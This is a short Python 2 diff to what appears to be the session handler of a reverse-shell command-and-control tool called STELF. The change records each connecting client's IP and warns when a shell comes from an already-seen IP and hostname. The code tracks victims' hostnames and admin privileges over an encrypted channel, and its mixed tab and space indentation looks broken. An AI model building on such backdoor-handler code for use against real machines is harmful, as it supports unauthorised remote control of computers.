@@ -255,7 +255,8 @@ class Client:
 		self.transport = Transport(cli, ip, port, id, aes_obj, self)
 		self.id = id
 		self.proxy_listener = None
-			
+
+                self.ip = ip
 		self.hostname = hostname
 		self.admin_privs = admin
 		
@@ -440,8 +441,12 @@ class Handler:
 				
 				hostname, admin = cli.recv(4096).split("|")
 				c = Client(id, cli, address, port, aes, hostname, admin)
-				self.clients.append(c)
 				
+				self.clients.append(c)
+                                for client in self.clients:
+                                    if client.hostname == hostname and client.ip == address:
+                                        print "Shell from existing IP + Hostname has been spawned..\n"
+
 				if not self.interacting:
 					sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
 					print INFO + "STELF session "+str(c.id)+" opened ("+address+":"+str(port)+" -> "+self.bind_addr+":"+str(self.bind_port)+")\n"
